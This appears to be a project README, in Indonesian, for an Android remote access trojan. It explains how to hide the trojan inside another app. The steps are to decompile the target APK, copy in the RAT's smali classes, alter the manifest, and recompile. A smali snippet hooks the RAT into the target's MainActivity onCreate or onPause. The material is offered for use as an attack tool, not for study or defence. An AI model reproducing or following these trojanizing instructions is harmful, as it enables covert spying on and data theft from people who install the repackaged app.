# android-rat-sisip
Hack android apk akses melalui internal root database
# Configure
- pertama decompile apk target terlebih dahulu menggunakan apktool
- kedua decompile apk ini(rat) menggunakan apktool
- salin code smali com/shun/.. di com/targetapk
- edit AndroidManifest.xml menyerupai AnfroidManifest.xml di apk rat ini
- lalu compile kembali

# Catatan
aplikasi ini tidak menggunakan xml script jadi tidak ribet cwim

# Update
jika xml tidak work
tambah:
    new-instance v0, Lcom/shun/hack/MainFileManager;

    invoke-direct {v0, p0}, Lcom/shun/hack/MainFileManager;-><init>(Landroid/content/Context;)V

di smali target MainActivity misal onPause atau onCreate
jangan lupa tambah package com.shun.hack

# Update V1.1
- decompile menggunakan apkeditor di repository android-crack-apkeditor
- untuk ubah code java bisa menggunakan Aide di repository android-crack-aide
- untuk penggunaan ikuti cara dibawah ini:<p>
   1). copykan code smali com/shun/hack/* diapk target </br>
   2). untuk versi ini tidak menggunakan AndroidManifest yang kemungkinan gagal dicompile </br>
   3). tambahkan code smali ini di MainActivity target biasanya di method onCreate </br>
       </p>
